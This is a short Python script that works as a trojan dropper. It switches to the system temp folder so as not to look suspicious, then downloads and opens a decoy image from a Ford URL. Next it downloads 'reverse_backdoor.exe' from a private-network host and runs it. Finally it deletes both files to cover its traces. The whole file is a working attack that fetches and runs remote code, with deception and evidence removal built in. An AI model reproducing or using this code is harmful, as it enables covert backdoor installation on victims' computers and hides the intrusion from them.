#!usr/bin/env python
import subprocess, requests, os, tempfile

#download a file
def download(url):
    get_response = requests.get(url)
    file_name= url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


#get temp dir, cross platform, better to temp so would not be suspicious
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
#legit photo
download("https://www.gpas-cache.ford.com/guid/b32c0221-86a5-31d6-afe1-9fd8c01a5bef.png")
subprocess.Popen("b32c0221-86a5-31d6-afe1-9fd8c01a5bef.png",shell=True)
#evil file
download("https://10.2.0.15/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe",shell=True)

#once done,remove to cover traces
os.remove("b32c0221-86a5-31d6-afe1-9fd8c01a5bef.png")
os.remove("reverse_backdoor.exe")